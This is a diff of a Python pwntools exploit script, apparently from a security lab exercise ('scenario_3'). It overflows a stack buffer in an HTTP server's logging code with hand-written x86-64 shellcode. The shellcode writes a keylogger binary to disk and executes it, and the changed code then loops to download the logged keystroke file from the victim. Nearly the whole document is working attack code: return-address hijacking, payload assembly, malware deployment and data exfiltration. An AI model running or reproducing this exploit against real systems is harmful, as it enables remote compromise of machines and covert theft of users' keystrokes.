@@ -45,33 +45,26 @@ from keystone import *
 from pwn import *
 
 ### CONFIGS ###
-host = "192.168.152.130"
-port = 8080 
-original_rbp = 0x7ffff75cee20 # the rbp value before the 'ret' instruction executed 
+host = "192.168.1.4"
+port = 8086
+original_rbp = 0x7ffff7ad1920 
 keylogger_start_address = 0x7ffff75cf2d1
 log_buffer_rbp_offset = 0x450 # the log buffer starts at $original_rbp-0x450
 log_buffer_prefix = 49 # the server already adds 49 bytes at start of the log buffer
 
 ### FUNCTIONS ###
-def watch_keyboard_input():
-    # Create a connection to the server
-    print(f"Connecting to {host}:{port}")
-    conn = remote(host, port)
-    
+def download_data_file():
+    url = f"http://{host}:{port}/logged_keyboard_events.txt"
+    local_path = './scenario_3/logged_keyboard_events.txt'
+
     try:
-        while True:
-            # Receive data from the server
-            data = conn.recv(1024)
-            if not data:
-                break
-            # Print the received key events
-            print(data.decode('utf-8'), end='')
-    except KeyboardInterrupt:
-        print("Client disconnected")
-    finally:
-        conn.close()
-    
-    print("Connection closed")
+        # Download the file using wget
+        wget(url, local_path)
+
+        print(f"File downloaded successfully to {local_path}")
+
+    except Exception as e:
+        print(f"Failed to download file. Error: {e}")
 
 ### PAYLOAD ###
 message_prefix = b"GET /data.txt HTTP/1.1\r\n"
@@ -87,7 +80,7 @@ crash += b"\r\n\r\n"
 
 ### CREATE THE ATTACK PAYLOAD ###
 # Load the keylogger binary file keylogger.exe
-with open("./scenario_3/keylogger_adv", "rb") as file:
+with open("./scenario_3/keylogger", "rb") as file:
   keylogger = file.read()
   
 # Get the keylogger
@@ -121,15 +114,15 @@ payload_rsp_offset = 0x10 + log_buffer_rbp_offset - log_buffer_prefix - message_
 # Shell code the runs the keylogger
 create_keylogger_shell_code = f"""
   # Create new file
-  lea rdi, [rsp-{payload_rsp_offset}] # ptr to injected "./keylogger"
-  lea rsi, [rsp-{payload_rsp_offset - keylogger_name_len}] # argv: ptr to placeholder (future NULL ptr)
-  lea rdx, [rsp-{payload_rsp_offset - keylogger_name_len}] # envp (= argv)
-  xor rdx, rdx                                # xor nullbytes with itself to make actual 0
+  lea rdi, [rsp-{payload_rsp_offset}] # ptr to "./keylogger"
+  lea rsi, [rsp-{payload_rsp_offset - keylogger_name_len}] # argv
+  lea rdx, [rsp-{payload_rsp_offset - keylogger_name_len}] # envp
+  xor rdx, rdx                                
   mov [rsi], rdx  
   xor rsi, rsi
-  mov sil, 102                                # create file
+  mov sil, 102                                
   xor rdx, rdx
-  mov dx, 0777                                # set mode
+  mov dx, 0777                              
   mov al, 2 
   syscall
   
@@ -143,14 +136,14 @@ create_keylogger_shell_code = f"""
   # syscall
     
   # Close the file
-  mov rdi, rax                                # load file pointer in rdi
+  mov rdi, rax                               
   mov al, 3
   syscall
 
   # Execute the keylogger
-  # lea rdi, [rsp-{payload_rsp_offset}] # ptr to injected "./keylogger"
-  # lea rsi, [rsp-{payload_rsp_offset - keylogger_name_len}] # argv: ptr to placeholder (future NULL ptr)
-  # lea rdx, [rsp-{payload_rsp_offset - keylogger_name_len}] # envp (= argv)
+  # lea rdi, [rsp-{payload_rsp_offset}] # ptr to "./keylogger"
+  # lea rsi, [rsp-{payload_rsp_offset - keylogger_name_len}] # argv
+  # lea rdx, [rsp-{payload_rsp_offset - keylogger_name_len}] # envp 
   # mov al, 59
   # syscall
 """
@@ -178,9 +171,15 @@ post_keylogger += keylogger
 
 ### CREATE THE RUN PAYLOAD ###
 run_keylogger_shell_code = f"""
-  lea rdi, [rsp-{payload_rsp_offset}] # ptr to injected "./keylogger"
-  lea rsi, [rsp-{payload_rsp_offset - keylogger_name_len}] # argv: ptr to placeholder (future NULL ptr)
-  lea rdx, [rsp-{payload_rsp_offset - keylogger_name_len}] # envp (= argv)
+  # Fork the process
+  # xor rax, rax           
+  # mov rax, 57             
+  # syscall
+
+  # Execute the keylogger
+  lea rdi, [rsp-{payload_rsp_offset}] # Ptr to "./keylogger"
+  lea rsi, [rsp-{payload_rsp_offset - keylogger_name_len}] # argv
+  lea rdx, [rsp-{payload_rsp_offset - keylogger_name_len}] # envp 
   xor rax, rax
   mov [rdx], rax
   mov al, 59
@@ -200,8 +199,6 @@ retaddr = original_rbp - log_buffer_rbp_offset + log_buffer_prefix + message_pre
 run_keylogger += retaddr.to_bytes((retaddr.bit_length() + 7) // 8, byteorder = "little") # add new little endian return address without trailing null bytes
 run_keylogger += b"\r\n\r\n"
 
-print(run_keylogger)
-
 ### PERFORM ATTACK ###
 #remote("localhost", port).send(crash) # send crash payload
 # sleep(2) # let the server restart
@@ -211,28 +208,8 @@ sleep(2)
 remote(host, port).send(post_keylogger) # send post payload
 sleep(2) 
 remote(host, port).send(run_keylogger) 
-sleep(2)
-watch_keyboard_input()
-
-# details for 'payload_rsp_offset':
-#
-# stack representation after return to the injected shell code:
-#
-#                            current_rsp <┐            ┌> original_rbp           ┌> start of vulnerable buffer
-#                                         |            |                         |
-#                                         ||<---0x10-->|<---------0x450--------->|
-# stack: <high addresses> =|======<1>======|retaddr|<2>|===========<3>===========| <low addresses>  (stack grow direction -->)
-#                          |               |           |<5>|=========<4>=========|
-#                          └> current_rbp  |               |==<6>==|==<7>=|==<8>=|
-#                                          |                       |<-24->|<-49->|
-#                                          |<--payload_rsp_offset->|
-#                                                                  └> start of injected payload
-# Legend:
-#   <1>: caller stack frame
-#   <2>: spilled rbp of the caller
-#   <3>: log_message stack frame
-#   <4>: vulnerable buffer
-#   <5>: other local variables   -> 5 VARS so 0x20 big
-#   <6>: injected payload
-#   <7>: "GET /data.txt HTTP/1.1\r\n"
-#   <8>: "== Request from..."
+sleep(10)
+print("Fetching the keylogged data...")
+while True:
+  download_data_file()
+  sleep(10)
